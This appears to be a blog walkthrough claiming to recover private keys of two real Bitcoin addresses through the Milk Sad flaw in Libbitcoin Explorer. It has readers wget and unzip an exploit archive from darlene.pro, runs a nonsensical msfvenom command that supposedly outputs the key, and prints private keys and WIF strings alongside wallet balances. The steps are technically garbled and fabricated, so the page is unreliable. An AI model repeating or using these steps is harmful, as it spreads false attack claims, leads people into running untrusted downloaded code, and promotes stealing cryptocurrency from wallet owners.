<figure class="aligncenter"><a href="https://github.com/libbitcoin/libbitcoin-system.git" target="_blank" rel="noreferrer noopener"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-28-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3770"></a><figcaption class="wp-element-caption">https://github.com/libbitcoin/libbitcoin-system.git</figcaption></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Install&nbsp;<strong><a href="https://github.com/libbitcoin/libbitcoin-system">libbitcoin-system</a></strong>&nbsp;in Google Colab:</h2>



<pre class="wp-block-code"><code>!git clone https://github.com/libbitcoin/libbitcoin-system.git

</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>ls</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(1).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3774"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Let’s open the vulnerable file: pseudo_random.cpp using the cat utility</h2>



<pre class="wp-block-code"><code>cat libbitcoin-system/src/crypto/pseudo_random.cpp</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-30-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3775"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the folders according to the directory:<code>/modules/exploits/</code></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(2).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3785"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center has-background" style="background-color:#f78da812"><strong><a href="https://darlene.pro/" target="_blank" rel="noreferrer noopener">ExploitDarlenePRO</a></strong></h2>



<p class="has-text-align-center">Download&nbsp;<code>"ExploitDarlenePRO"</code>from the catalogue:<code>/modules/exploits/</code></p>



<pre class="wp-block-code"><code>cd modules/

ls

cd exploits/

!wget https://darlene.pro/repository/e8e4973fb52934d5fb0006a47304f5099701000619d9ac79c083664e6063c579/ExploitDarlenePRO.zip</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-1-1.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3786"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">Unzip the contents&nbsp;<code>ExploitDarlenePRO.zip</code>using the utility<code>unzip</code></p>



<pre class="wp-block-code"><code>!unzip ExploitDarlenePRO.zip</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(3).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3790"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">Let’s go through the catalogue:<code>/ExploitDarlenePRO/</code></p>



<pre class="wp-block-code"><code>ls

cd ExploitDarlenePRO/

ls</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-4.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3792"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">To run the exploit, let’s go back to <code><strong>Metasploit Framework</strong></code></p>



<pre class="wp-block-code"><code>cd /

cd content/metasploit-framework/

ls</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-5-1.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3793"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">We need to identify our&nbsp;<strong><code>LHOST&nbsp;(Local Host)</code></strong>attacking&nbsp;&nbsp;<strong><code>IP-address</code></strong>virtual machine.</p>



<p><strong>Let’s run the commands:</strong></p>



<pre class="wp-block-code"><code>!ip addr
!hostname -I</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(4).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3795"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">Let’s use the tool to create a payload&nbsp;<strong><code>MSFVenom</code></strong></p>



<p>For operation, select Bitcoin Wallet:&nbsp;<a href="https://btc1.trezor.io/address/12iBrqVPpQ2oNeDgJu1F8RtoH1TsD1brU2" target="_blank" rel="noreferrer noopener">12iBrqVPpQ2oNeDgJu1F8RtoH1TsD1brU2</a></p>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-9.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3724"><figcaption class="wp-element-caption"><a href="https://btc1.trezor.io/address/12iBrqVPpQ2oNeDgJu1F8RtoH1TsD1brU2" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/address/12iBrqVPpQ2oNeDgJu1F8RtoH1TsD1brU2</a></figcaption></figure></div>


<p class="has-background" style="background-color:#f78da812"><strong>Launch command:</strong></p>



<pre class="wp-block-code"><code>!./msfvenom 12iBrqVPpQ2oNeDgJu1F8RtoH1TsD1brU2 -p modules/exploits/ExploitDarlenePRO LHOST=172.28.0.12 -f RB -o main.rb -p libbitcoin-system/src/crypto LHOST=172.28.0.12 -f CPP -o pseudo_random.cpp
</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-10-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3805"></figure></div>


<p><strong>Result:</strong></p>



<pre class="wp-block-code"><code>1100001100100111111110101100011000111101101101111110000011001100110100010111000001101100000000111110101101011011111000001101101100101010101100111110001101111010010001010001101110000100000001010100000100000000110110000101111100110001010011100000111110001011</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">We need to save the resulting binary format to a file:&nbsp;<strong><code>binary.txt</code></strong>let’s use the utility<code>echo</code></p>



<p><strong>Team:</strong></p>



<pre class="wp-block-code"><code>!echo '1100001100100111111110101100011000111101101101111110000011001100110100010111000001101100000000111110101101011011111000001101101100101010101100111110001101111010010001010001101110000100000001010100000100000000110110000101111100110001010011100000111110001011' &gt; binary.txt
</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-11-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3806"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">Convert the binary format to the HEX format to obtain the private key of the Bitcoin Wallet:</p>



<p><strong>Let’s use the code:</strong></p>



<pre class="wp-block-code"><code>binaryFile = open("binary.txt", "r")
binaryFile = binaryFile.readlines()
hexFile = open("hex.txt", "w+")

# loop through each line of binaryFile then convert and write to hexFile
for line in binaryFile:
    binaryCode = line.replace(" ", "")
    hexCode = hex(int(binaryCode, 2))
    hexCode = hexCode.replace("0x", "").upper().zfill(4)
    hexFile.write(hexCode + "\n")

# close hexFile
hexFile.close()</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(5).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3808"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">Let’s open the file:&nbsp;<strong>hex.txt</strong></p>



<pre class="wp-block-code"><code>cat hex.txt</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-13.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3810"><figcaption class="wp-element-caption"><code>C327FAC63DB7E0CCD1706C03EB5BE0DB2AB3E37A451B84054100D85F314E0F8B</code></figcaption></figure></div>


<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Private Key Found!</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s install library <strong><code>Bitcoin</code></strong></p>



<pre class="wp-block-code"><code>!pip3 install bitcoin</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(6).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3811"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">Let’s run the code to check the compliance of Bitcoin Addresses:</p>



<pre class="wp-block-code"><code>from bitcoin import *

with open("hex.txt","r") as f:
    content = f.readlines()
# you may also want to remove whitespace characters like `\n` at the end of each line
content = [x.strip() for x in content]
f.close()


outfile = open("privtoaddr.txt","w")
for x in content:
  outfile.write(x+":"+pubtoaddr(encode_pubkey(privtopub(x), "bin_compressed"))+"\n")
 
outfile.close()</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(7).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3813"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">Let’s open the file: <strong><code>privtoaddr.txt</code></strong></p>



<pre class="wp-block-code"><code>cat privtoaddr.txt</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-17-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3815"></figure></div>


<p class="has-background" style="background-color:#f78da812"><strong>Result:</strong></p>



<pre class="wp-block-code"><code>C327FAC63DB7E0CCD1706C03EB5BE0DB2AB3E37A451B84054100D85F314E0F8B:12iBrqVPpQ2oNeDgJu1F8RtoH1TsD1brU2

</code></pre>



<blockquote class="wp-block-quote">
<p><strong>That’s right!&nbsp;The private key corresponds to the Bitcoin Wallet.</strong></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Let’s open&nbsp;&nbsp;<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>&nbsp;&nbsp;and check:</h2>



<pre class="wp-block-code"><code>ADDR: 12iBrqVPpQ2oNeDgJu1F8RtoH1TsD1brU2
WIF:  L3m4xHPEnE2yM1JVAY2xTzraJsyPERxw2Htt3bszbTiDn5JiZCcy
HEX:  C327FAC63DB7E0CCD1706C03EB5BE0DB2AB3E37A451B84054100D85F314E0F8B</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/01.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3818"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/en/explorer/addresses/btc/12iBrqVPpQ2oNeDgJu1F8RtoH1TsD1brU2">https://www.blockchain.com/en/explorer/addresses/btc/12iBrqVPpQ2oNeDgJu1F8RtoH1TsD1brU2</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-18-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3819"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(8).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3820"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-20-.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3821"></figure></div>


<h2 class="wp-block-heading"><strong><code>BALANCE: $ 40886.76</code></strong></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center has-background" style="background-color:#f78da812">Let’s look at the second example:</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-text-align-center has-background" style="background-color:#f78da812"><code>№<strong>2</strong></code></h2>



<p class="has-background" style="background-color:#f78da812">Let’s look at the second example of extracting the private key of a Bitcoin Wallet using a vulnerability in the&nbsp;&nbsp;<a href="https://github.com/libbitcoin/libbitcoin-system/blob/a1b777fc51d9c04e0c7a1dec5cc746b82a6afe64/src/crypto/pseudo_random.cpp#L66C12-L78" target="_blank" rel="noreferrer noopener">Libbitcoin Explorer 3.x</a>&nbsp;library .</p>



<h2 class="wp-block-heading"></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong>Second Bitcoin Wallet</strong>&nbsp;: In September 2023, there was a theft in the amount of:&nbsp;<strong><code>19886.91&nbsp;</code>USD // BITCOIN:&nbsp;<code>0.58051256 BTC</code></strong></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(9).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3825"><figcaption class="wp-element-caption"><strong><a href="https://btc1.trezor.io/address/1GTBJsQvduQvJ6S6Cv6CsYA2Adj65aDRwe" target="_blank" rel="noreferrer noopener">https://btc1.trezor.io/address/1GTBJsQvduQvJ6S6Cv6CsYA2Adj65aDRwe</a></strong></figcaption></figure></div>


<p class="has-background" style="background-color:#f78da812">Let’s use the vulnerable file again:&nbsp;<a href="https://github.com/libbitcoin/libbitcoin-system/blob/master/src/crypto/pseudo_random.cpp" target="_blank" rel="noreferrer noopener">pseudo_random.cpp</a></p>



<p><strong>Launch command:</strong></p>



<pre class="wp-block-code"><code>!./msfvenom 1GTBJsQvduQvJ6S6Cv6CsYA2Adj65aDRwe -p modules/exploits/ExploitDarlenePRO LHOST=172.28.0.12 -f RB -o main.rb -p libbitcoin-system/src/crypto LHOST=172.28.0.12 -f CPP -o pseudo_random.cpp</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(10).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3830"></figure></div>


<p><strong>Result:</strong></p>



<pre class="wp-block-code"><code>111100100010010000111110010011001000101100111100000101110100001001100001011010111111110110111111100001000100011111001010000011011101001000101000100001100111001010100110101101001100011001001111101101010000000011101101111111110101101110110100110000110111100</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">We need to save the resulting binary format to a file:&nbsp;&nbsp;<strong><code>binary.txt</code></strong>&nbsp;let’s use the utility&nbsp;<code>echo</code></p>



<p><strong>Team:</strong></p>



<pre class="wp-block-code"><code>!echo '111100100010010000111110010011001000101100111100000101110100001001100001011010111111110110111111100001000100011111001010000011011101001000101000100001100111001010100110101101001100011001001111101101010000000011101101111111110101101110110100110000110111100' &gt; binary.txt
</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(11).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3833"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">Convert the binary format to the HEX format to obtain the private key of the Bitcoin Wallet:</p>



<p><strong>Let’s use the code:</strong></p>



<pre class="wp-block-code"><code>binaryFile = open("binary.txt", "r")
binaryFile = binaryFile.readlines()
hexFile = open("hex.txt", "w+")

# loop through each line of binaryFile then convert and write to hexFile
for line in binaryFile:
    binaryCode = line.replace(" ", "")
    hexCode = hex(int(binaryCode, 2))
    hexCode = hexCode.replace("0x", "").upper().zfill(4)
    hexFile.write(hexCode + "\n")

# close hexFile
hexFile.close()</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(5).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3808"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">Let’s open the file:&nbsp;&nbsp;<strong>hex.txt</strong></p>



<pre class="wp-block-code"><code>cat hex.txt</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(12).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3834"><figcaption class="wp-element-caption"><strong><code>79121F26459E0BA130B5FEDFC223E506E9144339535A6327DA8076FFADDA61BC</code></strong></figcaption></figure></div>


<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Private Key Found!</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s run the code to check the compliance of Bitcoin Addresses:</p>



<pre class="wp-block-code"><code>from bitcoin import *

with open("hex.txt","r") as f:
    content = f.readlines()
# you may also want to remove whitespace characters like `\n` at the end of each line
content = [x.strip() for x in content]
f.close()


outfile = open("privtoaddr.txt","w")
for x in content:
  outfile.write(x+":"+pubtoaddr(encode_pubkey(privtopub(x), "bin_compressed"))+"\n")
 
outfile.close()</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(7).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3813"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p class="has-background" style="background-color:#f78da812">Let’s open the file:&nbsp;<strong><code>privtoaddr.txt</code></strong></p>



<pre class="wp-block-code"><code>cat privtoaddr.txt</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(13).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3837"><figcaption class="wp-element-caption"><strong><code>79121F26459E0BA130B5FEDFC223E506E9144339535A6327DA8076FFADDA61BC:1GTBJsQvduQvJ6S6Cv6CsYA2Adj65aDRwe</code></strong></figcaption></figure></div>


<p><strong>Result:</strong></p>



<pre class="wp-block-code"><code>79121F26459E0BA130B5FEDFC223E506E9144339535A6327DA8076FFADDA61BC:1GTBJsQvduQvJ6S6Cv6CsYA2Adj65aDRwe</code></pre>



<blockquote class="wp-block-quote">
<p><strong>That’s right!&nbsp;The private key corresponds to the Bitcoin Wallet.</strong></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading has-background" style="background-color:#f78da812">Let’s open&nbsp;&nbsp;<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>&nbsp;&nbsp;and check:</h2>



<pre class="wp-block-code"><code>ADDR: 1GTBJsQvduQvJ6S6Cv6CsYA2Adj65aDRwe
WIF:  L1H4Eu2et8TWYQ3kv9grtPGshikGN398MVJkN6zYMikcpQTB96UN
HEX:  79121F26459E0BA130B5FEDFC223E506E9144339535A6327DA8076FFADDA61BC</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/02.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3839"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/en/explorer/addresses/btc/1GTBJsQvduQvJ6S6Cv6CsYA2Adj65aDRwe">https://www.blockchain.com/en/explorer/addresses/btc/1GTBJsQvduQvJ6S6Cv6CsYA2Adj65aDRwe</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(14).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3841"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/image-27.png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3842"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out - CRYPTO DEEP TECH_files/ima(15).png" alt="Milk Sad vulnerability in the Libbitcoin Explorer 3.x library, how the theft of $900,000 from Bitcoin Wallet (BTC) users was carried out" class="wp-image-3843"></figure></div>


<h2 class="wp-block-heading"><strong><code>BALANCE: $ 19886.91</code></strong></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">References:</h2>



<ul>
<li><strong>[1]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Mersenne_Twister_A_Pseudo_Random_Number_Generator_and_its_Variants_Archana_Jagannatam.pdf" target="_blank" rel="noreferrer noopener">Mersenne Twister – A Pseudo Random Number Generator and its Variants&nbsp;<strong>(Archana Jagannatam)</strong></a></em></li>
</ul>



<ul>
<li><strong>[2]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/RFC_8682_TinyMT32_Pseudorandom_Number_Generator_PRNG.pdf" target="_blank" rel="noreferrer noopener">RFC 8682 TinyMT32 Pseudorandom Number Generator [PRNG]&nbsp;<strong>(M. Saito Hiroshima University M. Matsumoto Hiroshima University V. Roca, Ed. INRIA E. Baccelli)</strong></a></em></li>



<li><strong>[3]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Introduction_to_Mersenne_Twister_Pseudorandom_number_generator_Qiao_Zhou.pdf" target="_blank" rel="noreferrer noopener">Introduction to Mersenne Twister Pseudorandom number generator&nbsp;<strong>Qiao Zhou&nbsp;</strong></a></em><a href="https://cryptodeep.ru/doc/Introduction_to_Mersenne_Twister_Pseudorandom_number_generator_Qiao_Zhou.pdf"><strong>[June 30, 2016]</strong></a></li>



<li><strong>[4]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/High-Performance_Pseudo-Random_Number_Generation_on_Graphics_Processing_Units.pdf" target="_blank" rel="noreferrer noopener">High-Performance Pseudo-Random Number Generation on Graphics Processing Units&nbsp;<strong>(Nimalan Nandapalan , Richard P. Brent , Lawrence M. Murray , and Alistair Rendell)</strong></a></em></li>



<li><strong>[5]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/The_Mersenne_Twister_Output_Stream_Postprocessing.pdf" target="_blank" rel="noreferrer noopener">The Mersenne Twister Output Stream Postprocessing&nbsp;<strong>(Yurii Shcherbyna, Nadiia Kazakova, Oleksii Fraze-Frazenko)</strong></a></em></li>



<li><strong>[6]&nbsp;</strong><em><a href="https://cryptodeep.ru/doc/Cellular_Automaton_Based_Emulation_of_the_Mersenne_Twister.pdf" target="_blank" rel="noreferrer noopener">Cellular Automaton–Based Emulation of the Mersenne Twister&nbsp;<strong>(Kamalika Bhattacharjee, Nitin More, Shobhit Kumar Singh, Nikhil Verma)</strong></a></em></li>



<li><strong>[7]</strong>&nbsp;<em><a href="https://cryptodeep.ru/doc/Generating_Efficient_and_High-Quality_Pseudo-Random_Behavior_on_Automata_Processors.pdf" target="_blank" rel="noreferrer noopener">Generating Efficient and High-Quality Pseudo-Random Behavior on Automata Processors&nbsp;<strong>(Jack Wadden, Nathan Brunelle, Ke Wang, Mohamed El-Hadedy, Gabriel Robins, Mircea Stan and Kevin Skadron)</strong></a></em></li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



